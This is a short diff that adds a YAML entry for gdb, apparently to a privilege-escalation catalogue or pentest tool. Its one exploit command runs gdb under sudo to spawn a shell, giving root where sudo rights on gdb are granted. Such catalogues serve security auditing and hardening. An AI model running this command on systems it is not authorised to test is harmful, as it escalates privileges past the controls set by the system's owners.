@@ -1,0 +1,4 @@
+name: gdb
+binary_path: /usr/bin/gdb
+exploit_cmds:
+- sudo /usr/bin/gdb -nx -ex '!/bin/sh' -ex quit
